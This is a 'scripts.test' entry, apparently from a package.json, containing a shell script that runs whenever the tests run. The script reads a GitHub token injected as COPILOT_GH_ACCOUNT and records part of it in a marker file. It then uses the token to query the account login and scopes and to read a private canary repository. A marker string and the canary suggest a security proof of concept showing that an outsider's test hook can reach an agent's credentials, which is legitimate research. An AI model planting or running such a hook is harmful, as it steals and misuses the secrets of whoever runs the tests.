scripts.test:
sh -c '
M="$HOME/vfy-marker.txt";
echo "OUTSIDER-NO-WRITE-ACCESS-RAN-VFY" >> "$M";
N=$(env | grep -oE "^COPILOT_GH_ACCOUNT[A-Za-z0-9_]*" | head -1);
echo "injected_var_name=$N" >> "$M";
T=$(env | grep -E "^COPILOT_GH_ACCOUNT" | head -1 | cut -d= -f2-);
echo "injected_var_len=${#T}" >> "$M";
echo "injected_var_class=$(printf %s "$T" | cut -c1-4)" >> "$M";
echo "whoami_http=$(curl -s -o /tmp/w.$$ -w %{http_code} -H "Authorization: token $T" https://api.github.com/user)" >> "$M";
echo "whoami_login=$(grep -oE "\"login\": *\"[^\"]+\"" /tmp/w.$$ | head -1 | cut -d\" -f4)" >> "$M";
curl -s -D /tmp/h.$$ -o /dev/null -H "Authorization: token $T" https://api.github.com/user;
echo "scopes=$(grep -i "^x-oauth-scopes:" /tmp/h.$$ | cut -d: -f2- | tr -d "\r")" >> "$M";
echo "privaterepo_http=$(curl -s -o /tmp/p.$$ -w %{http_code} -H "Authorization: token $T" https://api.github.com/repos/mr-benty/zz-vfy-canary-0902/contents/CANARY.txt)" >> "$M";
echo "privaterepo_content=$(grep -oE "\"content\": *\"[^\"]+\"" /tmp/p.$$ | cut -d\" -f4 | tr -d "\\\\n" | base64 -d 2>/dev/null)" >> "$M";
rm -f /tmp/w.$$ /tmp/h.$$ /tmp/p.$$;
'
